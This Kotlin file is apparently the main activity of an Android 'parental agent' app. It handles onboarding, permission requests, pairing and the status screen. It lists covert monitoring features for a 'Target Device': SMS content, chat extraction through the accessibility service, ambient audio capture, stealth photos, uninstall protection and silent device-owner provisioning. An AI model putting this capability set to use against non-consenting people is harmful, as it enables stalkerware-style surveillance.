package com.parental.agent.ui

import android.Manifest
import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.compose.runtime.*
import com.parental.agent.services.AgentDeviceAdminReceiver
import com.parental.agent.ui.navigation.Screen
import com.parental.agent.ui.onboarding.*
import com.parental.agent.ui.theme.AndroidAgentTheme

class MainActivity : ComponentActivity() {

    private val permissionsListState = mutableStateListOf<PermissionItem>()

    // Launcher for standard Android runtime permissions
    private val runtimePermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        refreshPermissionStates()
    }

    // Launcher for system settings screens
    private val settingsActivityLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStates()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Check & Execute Path A Device Owner Silent Provisioning if provisioned
        val deviceOwnerManager = com.parental.agent.policy.DeviceOwnerManager(this)
        if (deviceOwnerManager.isDeviceOwner()) {
            deviceOwnerManager.executeDeviceOwnerProvisioning()
        }

        initPermissionList()
        refreshPermissionStates()

        setContent {
            AndroidAgentTheme {
                var currentScreen by remember { mutableStateOf<Screen>(Screen.Terms) }
                var pairedDeviceName by remember { mutableStateOf("Target Device") }

                val featureCapabilities = remember(permissionsListState.map { it.isGranted }) {
                    val isLoc = permissionsListState.find { it.id == "loc" }?.isGranted == true
                    val isCalls = permissionsListState.find { it.id == "calls" }?.isGranted == true
                    val isSms = permissionsListState.find { it.id == "sms" }?.isGranted == true
                    val isUsage = permissionsListState.find { it.id == "usage" }?.isGranted == true
                    val isOverlay = permissionsListState.find { it.id == "overlay" }?.isGranted == true
                    val isAccess = permissionsListState.find { it.id == "accessibility" }?.isGranted == true
                    val isNotif = permissionsListState.find { it.id == "notification" }?.isGranted == true
                    val isAudio = permissionsListState.find { it.id == "audio" }?.isGranted == true
                    val isCamera = permissionsListState.find { it.id == "camera" }?.isGranted == true
                    val isAdmin = permissionsListState.find { it.id == "admin" }?.isGranted == true

                    listOf(
                        FeatureCapability(
                            name = "Live Location & Geofencing",
                            description = "Real-time GPS tracking & historical route playback",
                            status = if (isLoc) FeatureStatusLevel.FULL else FeatureStatusLevel.DISABLED,
                            statusNote = if (isLoc) "Fine GPS Active" else "Location Permission Missing"
                        ),
                        FeatureCapability(
                            name = "Call & SMS Telemetry",
                            description = "Incoming/outgoing call logs & SMS text content",
                            status = when {
                                isCalls && isSms -> FeatureStatusLevel.FULL
                                isCalls || isSms -> FeatureStatusLevel.PARTIAL
                                else -> FeatureStatusLevel.DISABLED
                            },
                            statusNote = when {
                                isCalls && isSms -> "Call Logs & SMS Active"
                                isCalls -> "Calls Only (SMS Missing)"
                                isSms -> "SMS Only (Calls Missing)"
                                else -> "Call & SMS Permissions Missing"
                            }
                        ),
                        FeatureCapability(
                            name = "Social Apps (WhatsApp, IG, Telegram)",
                            description = "Chat UI text, notification parsing & call activity",
                            status = when {
                                isAccess && isNotif -> FeatureStatusLevel.FULL
                                isNotif -> FeatureStatusLevel.PARTIAL
                                else -> FeatureStatusLevel.DISABLED
                            },
                            statusNote = when {
                                isAccess && isNotif -> "Full Chat Extraction & Notifications"
                                isNotif -> "Notification Inspection Only (Accessibility Disabled)"
                                else -> "Accessibility & Notification Service Disabled"
                            }
                        ),
                        FeatureCapability(
                            name = "App Blocker & Screen Time",
                            description = "Enforces app daily limits & block screens",
                            status = when {
                                isUsage && isOverlay -> FeatureStatusLevel.FULL
                                isUsage -> FeatureStatusLevel.PARTIAL
                                else -> FeatureStatusLevel.DISABLED
                            },
                            statusNote = when {
                                isUsage && isOverlay -> "Usage Tracking & Block Overlay Active"
                                isUsage -> "Usage Tracking Only (Overlay Disabled)"
                                else -> "App Usage Access Disabled"
                            }
                        ),
                        FeatureCapability(
                            name = "Call & Surround Audio Capture",
                            description = "Audio recording fallback & ambient surround",
                            status = if (isAudio) FeatureStatusLevel.PARTIAL else FeatureStatusLevel.DISABLED,
                            statusNote = if (isAudio) "Mic Fallback & Ambient Surround Active" else "Audio Permission Disabled"
                        ),
                        FeatureCapability(
                            name = "Stealth Photos & Screenshots",
                            description = "Instant photo capture & screen telemetry",
                            status = if (isCamera) FeatureStatusLevel.FULL else FeatureStatusLevel.DISABLED,
                            statusNote = if (isCamera) "Camera Active" else "Camera Permission Disabled"
                        ),
                        FeatureCapability(
                            name = "Uninstall Protection",
                            description = "Prevents unauthorized app removal",
                            status = if (isAdmin) FeatureStatusLevel.FULL else FeatureStatusLevel.DISABLED,
                            statusNote = if (isAdmin) "Device Admin Active" else "Device Admin Permission Missing"
                        )
                    )
                }

                when (currentScreen) {
                    is Screen.Terms -> {
                        TermsScreen(
                            onAccepted = {
                                currentScreen = Screen.Permissions
                            }
                        )
                    }

                    is Screen.Permissions -> {
                        PermissionsScreen(
                            permissionList = permissionsListState,
                            featureCapabilities = featureCapabilities,
                            onRequestPermission = { item ->
                                handlePermissionRequest(item)
                            },
                            onContinue = {
                                currentScreen = Screen.Pairing
                            }
                        )
                    }

                    is Screen.Pairing -> {
                        PairingScreen(
                            onPairDevice = { _, alias ->
                                pairedDeviceName = alias
                                currentScreen = Screen.ActiveStatus
                            }
                        )
                    }

                    is Screen.ActiveStatus -> {
                        ActiveStatusScreen(
                            deviceName = pairedDeviceName,
                            activeCollectorsCount = permissionsListState.count { it.isGranted }
                        )
                    }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        refreshPermissionStates()
    }

    private fun initPermissionList() {
        if (permissionsListState.isEmpty()) {
            permissionsListState.addAll(
                listOf(
                    PermissionItem("loc", "Location Service", "Fine & Background GPS tracking", isGranted = false),
                    PermissionItem("calls", "Call Logs & Telephony", "Call metadata & duration logs", isGranted = false),
                    PermissionItem("sms", "SMS Telemetry", "Incoming & outgoing SMS logs", isGranted = false),
                    PermissionItem("contacts", "Contacts Inventory", "Contact list synchronization", isGranted = false),
                    PermissionItem("usage", "App Usage Access", "Screen time & app usage duration", isGranted = false),
                    PermissionItem("accessibility", "Accessibility Service", "Chat UI inspection & web URL filter", isGranted = false),
                    PermissionItem("notification", "Notification Access", "Social app notification parsing", isGranted = false),
                    PermissionItem("admin", "Device Administrator", "Uninstall protection & remote lock", isGranted = false),
                    PermissionItem("audio", "Audio Recording", "Call fallback & surround sound capture", isGranted = false),
                    PermissionItem("camera", "Camera Access", "Stealth photo capture & QR scanner", isGranted = false, isMandatory = false),
                    PermissionItem("calendar", "Calendar Events", "Event title & schedule logs", isGranted = false, isMandatory = false),
                    PermissionItem("overlay", "System Overlay Window", "App Blocker warning screen overlay", isGranted = false, isMandatory = false),
                    PermissionItem("battery", "Battery Optimization", "Doze mode exemption", isGranted = false)
                )
            )
        }
    }

    private fun requestOrOpenAppSettings(vararg permissions: String) {
        val permanentlyDenied = permissions.any { perm ->
            val isNotGranted = ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED
            val isBlockedBySystem = !ActivityCompat.shouldShowRequestPermissionRationale(this, perm)
            isNotGranted && isBlockedBySystem
        }

        if (permanentlyDenied) {
            // Direct user to App Info -> Permissions screen in Android Settings
            val intent = Intent(
                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:$packageName")
            )
            settingsActivityLauncher.launch(intent)
        } else {
            runtimePermissionLauncher.launch(permissions.toList().toTypedArray())
        }
    }

    private fun handlePermissionRequest(item: PermissionItem) {
        when (item.id) {
            "loc" -> {
                requestOrOpenAppSettings(
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                )
            }
            "calls" -> {
                requestOrOpenAppSettings(
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_PHONE_STATE
                )
            }
            "sms" -> {
                requestOrOpenAppSettings(
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS
                )
            }
            "contacts" -> {
                requestOrOpenAppSettings(Manifest.permission.READ_CONTACTS)
            }
            "audio" -> {
                requestOrOpenAppSettings(Manifest.permission.RECORD_AUDIO)
            }
            "camera" -> {
                requestOrOpenAppSettings(Manifest.permission.CAMERA)
            }
            "calendar" -> {
                requestOrOpenAppSettings(Manifest.permission.READ_CALENDAR)
            }
            "usage" -> {
                val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                settingsActivityLauncher.launch(intent)
            }
            "accessibility" -> {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                settingsActivityLauncher.launch(intent)
            }
            "notification" -> {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                settingsActivityLauncher.launch(intent)
            }
            "admin" -> {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(
                        DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                        ComponentName(this@MainActivity, AgentDeviceAdminReceiver::class.java)
                    )
                    putExtra(
                        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Enable protection against unauthorized app uninstallation."
                    )
                }
                settingsActivityLauncher.launch(intent)
            }
            "overlay" -> {
                val intent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
                )
                settingsActivityLauncher.launch(intent)
            }
            "battery" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    val intent = Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:$packageName")
                    )
                    settingsActivityLauncher.launch(intent)
                }
            }
        }
    }

    private fun refreshPermissionStates() {
        for (i in permissionsListState.indices) {
            val item = permissionsListState[i]
            val isGranted = checkPermissionGranted(item.id)
            if (item.isGranted != isGranted) {
                permissionsListState[i] = item.copy(isGranted = isGranted)
            }
        }
    }

    private fun checkPermissionGranted(id: String): Boolean {
        return when (id) {
            "loc" -> ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

            "calls" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED

            "sms" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED

            "contacts" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

            "audio" -> ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED

            "camera" -> ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED

            "calendar" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED

            "usage" -> {
                val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
                val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
                } else {
                    @Suppress("DEPRECATION")
                    appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
                }
                mode == AppOpsManager.MODE_ALLOWED
            }

            "accessibility" -> {
                val pref = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
                pref.contains(packageName)
            }

            "notification" -> {
                val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: ""
                enabledListeners.contains(packageName)
            }

            "admin" -> {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val adminComponent = ComponentName(this, AgentDeviceAdminReceiver::class.java)
                dpm.isAdminActive(adminComponent)
            }

            "overlay" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    Settings.canDrawOverlays(this)
                } else {
                    true
                }
            }

            "battery" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                    pm.isIgnoringBatteryOptimizations(packageName)
                } else {
                    true
                }
            }

            else -> false
        }
    }
}
